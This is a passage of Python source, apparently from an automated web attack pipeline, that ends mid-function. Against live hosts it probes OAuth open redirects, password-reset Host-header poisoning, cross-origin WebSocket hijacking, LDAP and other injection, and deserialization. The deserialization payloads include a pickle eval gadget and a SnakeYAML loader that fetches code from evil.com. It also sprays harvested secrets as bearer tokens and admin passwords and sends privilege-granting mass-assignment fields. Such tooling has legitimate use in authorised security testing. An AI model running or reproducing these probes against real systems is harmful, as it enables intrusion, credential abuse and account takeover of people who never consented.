    "/oauth2/authorize", "/oauth2/token", "/oauth2/v1/authorize", "/oauth2/v1/token",
    "/auth", "/token", "/authorize", "/connect/token", "/connect/authorize",
    "/api/oauth/token", "/api/oauth/authorize",
]


async def phase_39_OAUTH(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"39-OAUTH"}:
        return {}
    _out = outdir / "oauth_misconfig.txt"
    if _out.exists() and not force:
        return {"39-OAUTH": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 39-OAUTH: OAuth misconfiguration testing")
    findings: List[str] = []
    # Load JWT analysis findings to inform OAuth testing
    jwt_file = outdir / "jwt_analysis.txt"
    if jwt_file.exists():
        jwt_findings = read_lines(jwt_file)
        if jwt_findings:
            for jf in jwt_findings[:10]:
                findings.append(f"[from-jwt] {jf}")
    _oa_urlopen = _get_urlopener()
    _oa_extra_headers = _extra_headers_dict()
    hosts_file = outdir / "host_targets.txt"
    if not hosts_file.exists():
        hosts_file = outdir / "hosts.txt"
    hosts = [f"https://{h}" if not h.startswith("http") else h
             for h in read_lines(hosts_file)][:_PIPELINE_CFG.sample_hosts_jwt]
    if not hosts:
        log("warn", "39-OAUTH: no hosts; skipping")
        return {"39-OAUTH": str(_out), "count": 0}
    endpoints_to_test: List[str] = []
    for base in hosts:
        for oauth_ep in _OAUTH_ENDPOINTS:
            endpoints_to_test.append(base.rstrip("/") + oauth_ep)
    endpoints_to_test = endpoints_to_test[:_PIPELINE_CFG.sample_endpoints_oauth * 5]
    async def _probe_oauth(ep_url: str) -> Optional[str]:
        try:
            req = urllib.request.Request(ep_url, method="GET",
                headers={"User-Agent": "Mozilla/5.0", **_oa_extra_headers})
            s, h, _ = await _async_urlopen_no_redirect(_oa_urlopen, req, timeout=8)
            if s in (200, 201, 302, 301, 405):
                if s not in (302, 301):
                    try:
                        req2 = urllib.request.Request(ep_url, method="GET",
                            headers={"User-Agent": "Mozilla/5.0", **_oa_extra_headers})
                        _, _, _ = await _async_urlopen_no_redirect(_oa_urlopen, req2, timeout=8)
                    except Exception:
                        pass
                return f"[oauth-endpoint] {ep_url} -> HTTP {s}"
            return None
        except Exception:
            return None
    ep_results = await asyncio.gather(*[_probe_oauth(ep) for ep in endpoints_to_test])
    for r in ep_results:
        if r:
            findings.append(r)
    for ep_url in [ep for ep in endpoints_to_test if any(m in ep.lower() for m in ("authorize",))]:
        try:
            req = urllib.request.Request(ep_url + "?response_type=code&client_id=test&redirect_uri=https://evil.com&scope=openid",
                method="GET", headers={"User-Agent": "Mozilla/5.0", **_oa_extra_headers})
            s, rh, _ = await _async_urlopen_no_redirect(_oa_urlopen, req, timeout=8)
            loc = rh.get("Location", "")
            if "evil.com" in loc:
                findings.append(f"[oauth-open-redirect] {ep_url} — redirect_uri accepted https://evil.com")
            req2 = urllib.request.Request(ep_url + "?response_type=code&client_id=test&redirect_uri=https://evil.com%2f.evil2.com&scope=openid",
                method="GET", headers={"User-Agent": "Mozilla/5.0", **_oa_extra_headers})
            s2, rh2, _ = await _async_urlopen_no_redirect(_oa_urlopen, req2, timeout=8)
            loc2 = rh2.get("Location", "")
            if "evil2.com" in loc2:
                findings.append(f"[oauth-redirect-bypass] {ep_url} — redirect_uri parser bypass: %2f.evil2.com")
        except urllib.error.HTTPError as e:
            loc3 = e.headers.get("Location", "")
            if "evil.com" in loc3 or "evil2.com" in loc3:
                findings.append(f"[oauth-redirect-error] {ep_url} -> HTTP {e.code} Location={loc3}")
        except Exception:
            continue
    if not findings:
        findings.append("[oauth] No OAuth endpoints found or no misconfigurations detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"39-OAUTH: {len(findings)} OAuth probes -> {out}")
    return {"39-OAUTH": str(out), "count": len(findings)}


# ────────────────── Phase 40-PWRESET: Password Reset Logic ─────────────────────
_PWRESET_ENDPOINTS = [
    "/reset", "/reset-password", "/forgot", "/forgot-password",
    "/password/reset", "/password/forgot", "/api/reset", "/api/forgot",
    "/password-reset", "/account/reset", "/user/reset",
]
_PWRESET_EMAIL_PARAMS = ["email", "user", "username", "account", "userid", "user_id"]


async def phase_40_PWRESET(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"40-PWRESET"}:
        return {}
    _out = outdir / "password_reset.txt"
    if _out.exists() and not force:
        return {"40-PWRESET": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 40-PWRESET: password reset logic testing")
    findings: List[str] = []
    # Load JWT analysis findings to inform password reset testing
    jwt_file = outdir / "jwt_analysis.txt"
    jwt_adv_file = outdir / "jwt_advanced.txt"
    if jwt_file.exists():
        jwt_findings = read_lines(jwt_file)
        if jwt_findings:
            for jf in jwt_findings[:5]:
                findings.append(f"[from-jwt] {jf}")
    if jwt_adv_file.exists():
        jwt_adv_findings = read_lines(jwt_adv_file)
        if jwt_adv_findings:
            for jaf in jwt_adv_findings[:5]:
                findings.append(f"[from-jwtadv] {jaf}")
    _pw_urlopen = _get_urlopener()
    _pw_extra_headers = _extra_headers_dict()
    hosts_file = outdir / "host_targets.txt"
    if not hosts_file.exists():
        hosts_file = outdir / "hosts.txt"
    hosts = [f"https://{h}" if not h.startswith("http") else h
             for h in read_lines(hosts_file)][:_PIPELINE_CFG.sample_hosts_jwt]
    if not hosts:
        log("warn", "40-PWRESET: no hosts; skipping")
        return {"40-PWRESET": str(_out), "count": 0}
    endpoints = []
    for base in hosts:
        for ep in _PWRESET_ENDPOINTS:
            endpoints.append(base.rstrip("/") + ep)
    for ep_url in endpoints[:_PIPELINE_CFG.sample_endpoints_pwreset]:
        try:
            req = urllib.request.Request(ep_url, method="GET",
                headers={"User-Agent": "Mozilla/5.0", **_pw_extra_headers})
            s, h, b = await _async_urlopen_no_redirect(_pw_urlopen, req, timeout=8)
            if s in (200, 201, 302, 301):
                findings.append(f"[pwreset-endpoint] {ep_url} -> HTTP {s}")
                for pname in _PWRESET_EMAIL_PARAMS:
                    test_url = ep_url + (("?" if "?" not in ep_url else "&") + f"{pname}=victim@evil.com&{pname}=attacker@evil.com")
                    try:
                        req2 = urllib.request.Request(test_url, method="POST",
                            data=b"email=attacker@evil.com",
                            headers={"Content-Type": "application/x-www-form-urlencoded",
                                     "User-Agent": "Mozilla/5.0", **_pw_extra_headers})
                        s2, _, b2 = await _async_urlopen_no_redirect(_pw_urlopen, req2, timeout=8)
                        if s2 in (200, 201, 302):
                            findings.append(f"[pwreset-param-pollution] {ep_url} — {pname} accepts email param")
                    except urllib.error.HTTPError:
                        pass
                    except Exception:
                        continue
                try:
                    host_inject_req = urllib.request.Request(ep_url, method="POST",
                        data=b"email=test@test.com",
                        headers={"Content-Type": "application/x-www-form-urlencoded",
                                 "Host": "evil.com", **_pw_extra_headers})
                    s3, h3, _ = await _async_urlopen_no_redirect(_pw_urlopen, host_inject_req, timeout=8)
                    loc = h3.get("Location", "") or h3.get("location", "")
                    if "evil.com" in loc:
                        findings.append(f"[pwreset-host-injection] {ep_url} — Host header reflected in Location: {loc}")
                except urllib.error.HTTPError as e:
                    loc = e.headers.get("Location", "") or e.headers.get("location", "")
                    if "evil.com" in loc:
                        findings.append(f"[pwreset-host-injection] {ep_url} — Host header reflected in Location: {loc} (HTTP {e.code})")
                except Exception:
                    continue
        except Exception:
            continue
    if not findings:
        findings.append("[pwreset] No password reset endpoints or logic issues detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"40-PWRESET: {len(findings)} password reset probes -> {out}")
    return {"40-PWRESET": str(out), "count": len(findings)}


# ────────────────── Phase 41-WEBSOCKET: WebSocket Security Testing ─────────────
_WS_COMMON_PATHS = ["/ws", "/wss", "/websocket", "/socket", "/sock", "/chat", "/stream", "/ws/"]


async def phase_41_WEBSOCKET(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"41-WEBSOCKET"}:
        return {}
    _out = outdir / "websocket.txt"
    if _out.exists() and not force:
        return {"41-WEBSOCKET": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 41-WEBSOCKET: WebSocket endpoint discovery and deep testing")
    if _PIPELINE_CFG.proxy or _USE_PROXYCHAINS:
        log("warn", "41-WEBSOCKET: raw socket connections are incompatible with proxy/Tor; skipping")
        return {"41-WEBSOCKET": str(_out), "count": 0}
    findings: List[str] = []
    _ws_extra_headers = _extra_headers_dict()
    hosts_file = outdir / "host_targets.txt"
    if not hosts_file.exists():
        hosts_file = outdir / "hosts.txt"
    hosts = read_lines(hosts_file)[:_PIPELINE_CFG.sample_hosts_websocket]
    if not hosts:
        log("warn", "41-WEBSOCKET: no hosts; skipping")
        return {"41-WEBSOCKET": str(_out), "count": 0}

    import socket as _socket
    import ssl as _ssl
    import base64 as _b64
    import struct as _struct

    def _ws_encode_frame(data: bytes, opcode: int = 0x1) -> bytes:
        frame = bytearray()
        frame.append(0x80 | opcode)
        mask = os.urandom(4)
        length = len(data)
        if length < 126:
            frame.append(0x80 | length)
        elif length < 65536:
            frame.append(0x80 | 126)
            frame += _struct.pack("!H", length)
        else:
            frame.append(0x80 | 127)
            frame += _struct.pack("!Q", length)
        frame += mask
        frame += bytes(b ^ mask[i % 4] for i, b in enumerate(data))
        return bytes(frame)

    def _ws_try_upgrade(
        host: str, ws_path: str, scheme: str,
        extra_headers: Optional[Dict[str, str]] = None,
    ) -> Optional[Tuple[_socket.socket, str]]:
        host_clean = host.split(":")[0] if ":" in host else host
        ws_host_safe = host_clean.replace("\r", "").replace("\n", "")
        port = 443 if scheme == "wss" else 80
        if ":" in host:
            try:
                port = int(host.split(":")[1])
            except (ValueError, IndexError):
                pass
        try:
            sock = _socket.socket(_socket.AF_INET, _socket.SOCK_STREAM)
            sock.settimeout(5)
            if scheme == "wss":
                ctx = _ssl.create_default_context()
                sock = ctx.wrap_socket(sock, server_hostname=host_clean)
            sock.connect((host_clean, port))
            ws_key = _b64.b64encode(os.urandom(16)).decode()
            upgrade = (
                f"GET {ws_path} HTTP/1.1\r\n"
                f"Host: {ws_host_safe}\r\n"
                f"Upgrade: websocket\r\n"
                f"Connection: Upgrade\r\n"
                f"Sec-WebSocket-Key: {ws_key}\r\n"
                f"Sec-WebSocket-Version: 13\r\n"
            )
            if extra_headers:
                for k, v in extra_headers.items():
                    upgrade += f"{k}: {v}\r\n"
            upgrade += "\r\n"
            sock.sendall(upgrade.encode())
            resp = b""
            try:
                while True:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    resp += chunk
                    if len(resp) > MAX_RECV or b"\r\n\r\n" in resp:
                        break
            except _socket.timeout:
                pass
            resp_text = resp.decode("utf-8", errors="ignore")
            if re.search(r'\b101\b', resp_text) and "Upgrade: websocket" in resp_text:
                return (sock, f"{scheme}://{ws_host_safe}{ws_path}")
            sock.close()
        except Exception:
            try:
                sock.close()
            except Exception:
                pass
        return None

    def _ws_send_recv(sock: _socket.socket, data: bytes, timeout: float = 3.0) -> Optional[bytes]:
        sock.settimeout(timeout)
        try:
            frame = _ws_encode_frame(data)
            sock.sendall(frame)
            resp = b""
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                resp += chunk
                if len(resp) > MAX_RECV:
                    break
                if len(resp) >= 2:
                    b1 = resp[1]
                    payload_len = b1 & 0x7F
                    offset = 2
                    if payload_len == 126:
                        if len(resp) < 4:
                            continue
                        payload_len = _struct.unpack("!H", resp[2:4])[0]
                        offset = 4
                    elif payload_len == 127:
                        if len(resp) < 10:
                            continue
                        payload_len = _struct.unpack("!Q", resp[2:10])[0]
                        offset = 10
                    masked = bool(b1 & 0x80)
                    if masked:
                        offset += 4
                    if len(resp) >= offset + payload_len:
                        payload = resp[offset:offset + payload_len]
                        if masked:
                            mask = resp[offset - 4:offset]
                            payload = bytes(b ^ mask[i % 4] for i, b in enumerate(payload))
                        return payload
            return None
        except _socket.timeout:
            return None
        except Exception:
            return None

    for host in hosts:
        host_clean = host.split(":")[0] if ":" in host else host
        for ws_path in _WS_COMMON_PATHS:
            ws_host_safe = host_clean.replace("\r", "").replace("\n", "")
            for scheme in ("wss", "ws"):
                ws_url = f"{scheme}://{ws_host_safe}{ws_path}"

                up = _ws_try_upgrade(host, ws_path, scheme)
                if up is None:
                    continue
                sock, ws_url = up
                findings.append(f"[websocket-open] {ws_url} — WebSocket upgrade accepted")
                sock.close()

                for origin in ["null", "https://attacker.com"]:
                    try:
                        co_up = _ws_try_upgrade(host, ws_path, scheme, {"Origin": origin})
                        if co_up is not None:
                            co_sock, _ = co_up
                            findings.append(f"[cswsh] {ws_url} — cross-origin WebSocket accepted (Origin: {origin})")
                            co_sock.close()
                    except Exception:
                        pass

                try:
                    na_up = _ws_try_upgrade(host, ws_path, scheme)
                    if na_up is not None:
                        na_sock, _ = na_up
                        resp = _ws_send_recv(na_sock, b'{"type":"ping"}')
                        if resp is not None:
                            findings.append(f"[ws-auth-bypass] {ws_url} — privileged frame accepted without auth")
                        na_sock.close()
                except Exception:
                    pass

                for inj in [b"' OR '1'='1", b"${7*7}", b"{{7*7}}", b"<script>alert(1)</script>"]:
                    try:
                        inj_up = _ws_try_upgrade(host, ws_path, scheme)
                        if inj_up is not None:
                            inj_sock, _ = inj_up
                            resp = _ws_send_recv(inj_sock, inj)
                            if resp is not None:
                                rtext = resp.decode("utf-8", errors="ignore").lower()
                                if any(e in rtext for e in ["error", "syntax", "unexpected", "exception", "warning"]):
                                    findings.append(f"[ws-injection] {ws_url} — injection payload triggers error response")
                            inj_sock.close()
                    except Exception:
                        pass

                try:
                    lf_up = _ws_try_upgrade(host, ws_path, scheme)
                    if lf_up is not None:
                        lf_sock, _ = lf_up
                        resp = _ws_send_recv(lf_sock, b"A" * 65536, timeout=2.0)
                        if resp is not None:
                            findings.append(f"[ws-long-frame] {ws_url} — 64KB frame accepted gracefully")
                        lf_sock.close()
                except Exception:
                    pass

                try:
                    sp_up = _ws_try_upgrade(host, ws_path, scheme,
                        {"Sec-WebSocket-Protocol": "graphql-ws, json, soap"})
                    if sp_up is not None:
                        sp_sock, _ = sp_up
                        findings.append(f"[ws-subprotocol] {ws_url} — subprotocol negotiation accepted")
                        sp_sock.close()
                except Exception:
                    pass

    if not findings:
        findings.append("[websocket] No WebSocket endpoints discovered")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"41-WEBSOCKET: {len(findings)} WebSocket probes -> {out}")
    return {"41-WEBSOCKET": str(out), "count": len(findings)}


# ────────────────── Phase 42-LDAP: LDAP Injection Detection ────────────────────
async def phase_42_LDAP(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"42-LDAP"}:
        return {}
    _out = outdir / "ldap_injection_42.txt"
    if _out.exists() and not force:
        return {"42-LDAP": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 42-LDAP: LDAP injection detection")
    urls = outdir / "urls_all.txt"
    all_urls = read_lines(urls) if urls.exists() else []
    if not all_urls:
        log("warn", "42-LDAP: no URLs; skipping")
        return {"42-LDAP": str(_out), "count": 0}
    findings: List[str] = []
    _l_urlopen = _get_urlopener()
    _l_extra_headers = _extra_headers_dict()
    param_urls = [
        u for u in all_urls if "=" in u and not _is_static_url(u)
    ][:_PIPELINE_CFG.sample_urls_ldap]
    _LDAP42_PAYLOADS = ["*", "*)(uid=*))", "*)(|(uid=*", "admin*", "*|uid=*", "*((uid=*", "*)(uid=*"]
    _LDAP42_SPECIFIC = [
        "javax.naming", "ldapexception", "ldap_error", "invalid dn syntax",
        "ldap_no_such_object", "operationserror", "invalidcredentials",
        "ldap_result_entry", "com.sun.jndi.ldap",
    ]
    _LDAP42_GENERIC_BASELINE = {"error", "syntax", "malformed", "bad search filter", "protocol error"}
    for u in param_urls:
        parsed = urllib.parse.urlparse(u)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        if not qs:
            continue
        baseline_lower = ""
        try:
            base_req = urllib.request.Request(u, headers={"User-Agent": "Mozilla/5.0", **_l_extra_headers})
            _, _, base_bytes = await _async_urlopen(_l_urlopen, base_req, timeout=8)
            baseline_lower = base_bytes.decode("utf-8", errors="ignore").lower()
        except Exception:
            continue
        for pname in qs:
            if pname.lower() in _SKIP_PARAMS:
                continue
            for payload in _LDAP42_PAYLOADS:
                await _throttle_rate()
                test_qs = qs.copy()
                test_qs[pname] = [payload]
                new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                try:
                    req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0", **_l_extra_headers})
                    _, _, body_bytes = await _async_urlopen_no_redirect(_l_urlopen, req, timeout=8)
                    body = body_bytes.decode("utf-8", errors="ignore").lower()
                    if any(ind in body for ind in _LDAP42_SPECIFIC):
                        findings.append(f"[ldap-candidate] {test_url} param={pname} payload={payload}")
                        break
                    generic_new = {w for w in _LDAP42_GENERIC_BASELINE if w in body and w not in baseline_lower}
                    if generic_new:
                        findings.append(f"[ldap-candidate-generic] {test_url} param={pname} payload={payload} keywords={generic_new}")
                        break
                except Exception:
                    continue
    if not findings:
        findings.append("[ldap] No LDAP injection candidates detected (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"42-LDAP: {len(findings)} LDAP probes -> {out}")
    return {"42-LDAP": str(out), "count": len(findings)}


# ────────────────── Phase 43-DESERIAL: Insecure Deserialization Detection ──────
_DESERIAL_PAYLOADS: List[Tuple[str, bytes, str]] = [
    ("PHP", b'O:1:"A":0:{}', "PHP unserialize"),
    ("PHP", b'a:1:{i:0;O:1:"B":0:{}}', "PHP array unserialize"),
    ("Java", b'\xac\xed\x00\x05', "Java serialization (0xACED0005)"),
    ("Java", b'\xac\xed\x00\x05sr\x00\x12java.lang.Runtime', "Java Runtime serialization"),
    ("Python", b'(dp0\nS\'test\'\np1\n.', "Python pickle protocol 0"),
    ("Python", b'\x80\x04\x95\x00\x00\x00\x00\x00\x00\x00\x00\x8c\x08builtins\x8c\x04eval\x93\x00.',
     "Python pickle protocol 4 eval"),
    ("Ruby", b'\x04\x08o:\x08Object\x00', "Ruby Marshal.load"),
    (".NET", b'\x00\x01\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00',
     ".NET BinaryFormatter"),
    ("Node.js", b'{"__proto__":{"admin":true},"rce":"_$$ND_FUNC$$_function(){}"}',
     "Node.js serialize __proto__ pollution"),
    ("YAML", b'!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://evil.com/"]]]]',
     "YAML deserialization (SnakeYAML)"),
]


async def phase_43_DESERIAL(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"43-DESERIAL"}:
        return {}
    _out = outdir / "deserialization.txt"
    if _out.exists() and not force:
        return {"43-DESERIAL": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 43-DESERIAL: insecure deserialization payload probing")
    findings: List[str] = []
    _d_urlopen = _get_urlopener()
    _d_extra_headers = _extra_headers_dict()
    urls_file = outdir / "urls_all.txt"
    all_urls = read_lines(urls_file) if urls_file.exists() else []
    api_targets = list({u.split("?")[0] for u in all_urls
        if any(m in u.lower() for m in ("/api/", "/v1/", "/v2/", "/graphql", "/rpc"))})[:_PIPELINE_CFG.sample_endpoints_deserial]
    if not api_targets:
        api_targets = list({u.split("?")[0] for u in all_urls})[:_PIPELINE_CFG.sample_endpoints_deserial]
    if not api_targets:
        log("warn", "43-DESERIAL: no API endpoints; skipping")
        return {"43-DESERIAL": str(_out), "count": 0}
    for ep in api_targets:
        for lang, payload, desc in _DESERIAL_PAYLOADS:
            try:
                req = urllib.request.Request(ep, data=payload, method="POST",
                    headers={"Content-Type": "application/octet-stream",
                             "User-Agent": "Mozilla/5.0", **_d_extra_headers})
                ds, _, db = await _async_urlopen_no_redirect(_d_urlopen, req, timeout=15)
                body = db.decode("utf-8", errors="ignore").lower()
                if ds in (500, 502, 503, 504):
                    findings.append(f"[deserial-crash] {ep} {lang} -> HTTP {ds} ({desc})")
                elif ds in (200, 201, 302):
                    time_indicators = ["error", "exception", "class", "object", "unserialize", "deserialize",
                                       "stack trace", "warning", "fatal"]
                    if any(ind in body for ind in time_indicators):
                        findings.append(f"[deserial-reflected] {ep} {lang} -> error indicators in response ({desc})")
            except urllib.error.HTTPError as e:
                if e.code in (500, 502, 503, 504, 400):
                    try:
                        err_body = e.read().decode("utf-8", errors="ignore").lower()
                        if any(ind in err_body for ind in ["error", "exception", "class", "object", "stack", "unserialize"]):
                            findings.append(f"[deserial-error] {ep} {lang} -> HTTP {e.code} with error details ({desc})")
                    except Exception:
                        pass
            except Exception:
                continue
    if not findings:
        findings.append("[deserial] No deserialization vulnerabilities detected (may require manual testing)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"43-DESERIAL: {len(findings)} deserialization probes -> {out}")
    return {"43-DESERIAL": str(out), "count": len(findings)}


async def phase_44_CHAIN(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"44-CHAIN"}:
        return {}
    _out = outdir / "chain_correlation.txt"
    if _out.exists() and not force:
        return {"44-CHAIN": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 44-CHAIN: cross-reference findings across phases")
    findings: List[str] = []
    # 1. Test secrets from 15-SECRETS as credentials against auth endpoints from 05-HARVEST
    secrets_file = outdir / "secrets.txt"
    urls_file = outdir / "urls_all.txt"
    secrets: List[str] = []
    if secrets_file.exists():
        for ln in read_lines(secrets_file):
            # Extract potential credential patterns: base64, JWTs, API keys
            if any(k in ln.lower() for k in ("apikey", "api_key", "secret", "token", "password", "jwt", "bearer", "access_key")):
                secrets.append(ln)
    auth_endpoints: List[str] = []
    if urls_file.exists():
        for u in read_lines(urls_file):
            if any(p in u.lower() for p in ("/login", "/auth", "/oauth", "/token", "/signin", "/api/v1/auth")):
                auth_endpoints.append(u)
    if secrets and auth_endpoints:
        _ch_urlopen = _get_urlopener()
        _ch_extra_headers = _extra_headers_dict()
        findings.append(f"credential_test: {len(secrets)} secrets × {len(auth_endpoints)} endpoints")
        for secret in secrets[:_PIPELINE_CFG.sample_endpoints_l]:
            for endpoint in auth_endpoints[:_PIPELINE_CFG.sample_endpoints_l]:
                await _throttle_rate()
                try:
                    # Try the secret as a bearer token
                    req = urllib.request.Request(endpoint, method="GET",
                        headers={"Authorization": f"Bearer {secret.strip()}", "User-Agent": "Mozilla/5.0", **_ch_extra_headers})
                    s, _, _ = await _async_urlopen(_ch_urlopen, req, timeout=10)
                    if s == 200:
                        findings.append(f"[credential-hit] Bearer {secret[:60]}... → HTTP 200 on {endpoint}")
                    # Also try as form-encoded credential
                    data = urllib.parse.urlencode({"username": "admin", "password": secret.strip()}).encode()
                    req2 = urllib.request.Request(endpoint, data=data, method="POST",
                        headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0", **_ch_extra_headers})
                    s2, _, _ = await _async_urlopen(_ch_urlopen, req2, timeout=10)
                    if s2 in (200, 302):
                        findings.append(f"[credential-hit] admin:{secret[:60]}... → HTTP {s2} on {endpoint}")
                except Exception:
                    continue
    # 2. Cross-reference IDOR endpoints with mass-assignment payloads
    idor_file = outdir / "idor.txt"
    if idor_file.exists():
        idor_endpoints: Set[str] = set()
        for ln in read_lines(idor_file):
            for token in ln.split():
                if token.startswith("http"):
                    idor_endpoints.add(token.split("?")[0])
                    break
        if idor_endpoints:
            _ma_urlopen = _get_urlopener()
            _MASS_ASSIGN_VALUES_CHAIN: Dict[str, object] = {
                "admin": True, "is_admin": True, "role": "admin", "roles": ["admin"],
                "permissions": ["admin"], "plan": "enterprise", "tier": "premium",
                "balance": 999999, "points": 999999,
            }
            findings.append(f"idor_mass_assign_test: {len(idor_endpoints)} endpoints")
            for ep in sorted(idor_endpoints)[:_PIPELINE_CFG.sample_endpoints_l]:
                for field, val in _MASS_ASSIGN_VALUES_CHAIN.items():
                    await _throttle_rate()
                    body = json.dumps({field: val}).encode()
                    try:
                        req = urllib.request.Request(ep, data=body, method="POST",
                            headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"})
                        ms, _, _ = await _async_urlopen(_ma_urlopen, req, timeout=8)
                        if ms in (200, 201, 302):
                            findings.append(f"[idor-massassign] {ep} POST {{{field}: {json.dumps(val)}}} → HTTP {ms}")
                    except Exception:
                        continue
    # 3. Check for SSRF-to-LFI chaining
    ssrf_meta = outdir / "ssrf_meta.txt"
    if ssrf_meta.exists():
        for ln in read_lines(ssrf_meta):
            if "credential-exfil" in ln:
                findings.append(f"[chain-ssrf-lfi] SSRF metadata exfiltration: {ln}")
    if not findings:
        findings.append("[result] No cross-phase correlations identified")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"44-CHAIN: {len(findings)} correlations → {out}")
    return {"44-CHAIN": str(_out), "count": len(findings)}


# ──────────────────────── Phase 45 helpers: PoC generation ────────────────────────

def _detect_finding_type(line: str) -> str:
    lc = line.lower()
    if lc.startswith("[xss]") or lc.startswith("[domxss]"):
        return "xss"
    if lc.startswith("[sqlmap]") or lc.startswith("[sql-injection]"):
        return "sql-injection"
    if lc.startswith("[ssrf]") or lc.startswith("[ssrf-meta]"):
        return "ssrf"
    if lc.startswith("[idor]") or lc.startswith("[massassign]") or lc.startswith("[idor-massassign]"):
        return "idor"
    if lc.startswith("[open-redirect]") or lc.startswith("[redirect]"):
        return "open-redirect"
    if lc.startswith("[auth-bypass]") or lc.startswith("[authz]"):
        return "auth-bypass"
    if lc.startswith("[cache-poison]") or lc.startswith("[wcd]"):
        return "cache-poison"
    if lc.startswith("[lfi]") or lc.startswith("[lfi-confirmed]") or lc.startswith("[path-traversal]"):
        return "lfi"
    if lc.startswith("[smuggling]") or lc.startswith("[h2-") or lc.startswith("[h3-"):
        return "smuggling"
    if lc.startswith("[ws-") or lc.startswith("[cswsh]"):
        return "websocket"
    if lc.startswith("[graphql-"):
        return "graphql"
    if lc.startswith("[ssti]"):
        return "ssti"
    return "generic"


def _extract_url_from_line(line: str) -> Optional[str]:
    for token in line.split():
        if token.startswith("http://") or token.startswith("https://"):
            return token
    return None


def _finding_type_label(ftype: str) -> str:
    labels = {
        "xss": "Cross-Site Scripting (XSS)",
        "sql-injection": "SQL Injection",
        "ssrf": "Server-Side Request Forgery (SSRF)",
        "idor": "Insecure Direct Object Reference (IDOR) / Mass Assignment",
        "open-redirect": "Open Redirect",
        "auth-bypass": "Authentication Bypass / Authorization Issue",
        "cache-poison": "Cache Poisoning / Web Cache Deception",
        "lfi": "Local File Inclusion / Path Traversal",
        "smuggling": "HTTP Request Smuggling / Desync",
        "websocket": "WebSocket / Cross-Site WebSocket Hijacking (CSWSH)",
        "graphql": "GraphQL Vulnerability",
        "ssti": "Server-Side Template Injection (SSTI)",
        "generic": "Security Finding",
    }
    return labels.get(ftype, "Security Finding")


def _estimate_confidence(line: str) -> str:
    lc = line.lower()
    if "critical" in lc:
        return "Critical"
    if "high" in lc or "confirmed" in lc:
        return "High"
    if "medium" in lc:
        return "Medium"
    if "low" in lc:
        return "Low"
    return "High"


def _description_from_line(line: str) -> str:
    for prefix in ("[finding]", "[confirmed]", "[lfi-confirmed]", "[credential-hit]",
                   "[idor]", "[credential-exfil]", "[sql-injection]", "[xss]",
                   "[ssti]", "[ssrf]", "[massassign]", "[idor-massassign]", "[domxss]",
                   "[sqlmap]", "[ssrf-meta]", "[open-redirect]", "[redirect]",
                   "[auth-bypass]", "[authz]", "[cache-poison]", "[wcd]",
                   "[lfi]", "[path-traversal]", "[smuggling]",
                   "[h2-", "[h3-", "[ws-", "[cswsh]", "[graphql-"):
        if line.lower().startswith(prefix):
            rest = line[len(prefix):].strip()
            parts = rest.split(" - ", 1)
            if len(parts) > 1:
                return parts[1].strip()
            return rest
    return line


def _generate_poc_xss(line: str, url: Optional[str], timestamp: str) -> str:
    target = url or "[URL not found in line]"
    desc = _description_from_line(line)
    html_harness = (
        "<html>\n<body>\n"
        "<script>\n"
        f"  var win = window.open('{target.replace(chr(39), '%27')}', "
        "'poc', 'width=800,height=600');\n"
        "  setTimeout(function() { if (win) win.close(); }, 5000);\n"
        "</script>\n"
        "<p><strong>PoC opened in popup window.</strong></p>\n"
        "<p>If blocked, allow popups for this domain and reload.</p>\n"
        "<p><em>Attach a screenshot of the alert/execution as proof.</em></p>\n"
        "</body>\n</html>"
    )
    return (
        f"# Proof of Concept: Cross-Site Scripting (XSS)\n\n"
        f"**PoC ID:** `poc_xss`\n"
        f"**Timestamp:** {timestamp}\n"
        f"**Finding Type:** Cross-Site Scripting (XSS)\n"
        f"**Target URL:** {target}\n"
        f"**Confidence:** High\n"
        f"**Description:** {desc}\n\n"
        f"---\n\n"
        f"## Steps to Reproduce\n"
        f"1. Visit the target URL to observe the reflected XSS\n"
        f"2. Use the cURL command to verify the injection point\n"
        f"3. Open the HTML harness below in a browser to demonstrate popup-based PoC\n\n"
        f"## cURL Command\n"
        f"```bash\n"
        f"curl -s \"{target}\" -H \"User-Agent: Mozilla/5.0\" --insecure\n"
        f"```\n\n"
        f"## HTML Harness\n"
        f"Save as `poc_xss.html` and open in browser:\n\n"
        f"```html\n{html_harness}\n```\n\n"
